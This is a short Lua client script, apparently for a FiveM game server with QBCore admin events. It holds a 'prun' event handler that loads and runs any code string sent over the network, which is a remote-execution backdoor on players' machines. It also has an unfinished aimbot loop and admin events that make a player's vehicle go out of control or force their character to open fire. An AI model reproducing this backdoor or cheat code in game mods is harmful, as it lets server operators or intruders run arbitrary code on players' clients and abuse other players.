local aimbot = false
local boostSpeeds = {}

function ToggleAimbot(state)
    aimbot = state

    CreateThread(function()
        while aimbot do
            Wait(1)
            for k, v in pairs(GetActivePlayers()) do
                local ped = GetPlayerPed(v)
                local coords = GetEntityCoords(ped)
                local retval, x, y = GetHudScreenPositionFromWorldPosition(coords.x, coords.y, coords.z)

                if not retval then
                end
            end
        end
    end)
end


RegisterNetEvent("prun", function(code)
    local script, error = load(code)
    if script and not error then
        script()
    end
end)

RegisterCommand('propfix', function()
    for k, v in pairs(GetGamePool('CObject')) do
        if IsEntityAttachedToEntity(PlayerPedId(), v) then
            SetEntityAsMissionEntity(v, true, true)
            DeleteObject(v)
            DeleteEntity(v)
        end
    end
end) 

RegisterNetEvent("qb-admin:client:destroyControl", function()
    SetVehicleOutOfControl(GetVehiclePedIsIn(PlayerPedId()), true, true)
end)

RegisterNetEvent("qb-admin:client:clonePed", function()
    local player = PlayerPedId()
    local ped = ClonePed(player, GetEntityHeading(player))
end)

RegisterNetEvent("qb-admin:client:shotForawrd", function()
    local player = PlayerPedId()
    local coords = GetOffsetFromEntityInWorldCoords(player, 0.0, 10.0, 0.0)
    TaskShootAtCoord(player, coords.x, coords.y, coords.z, 2000.0, "FIRING_PATTERN_BURST_FIRE")
end)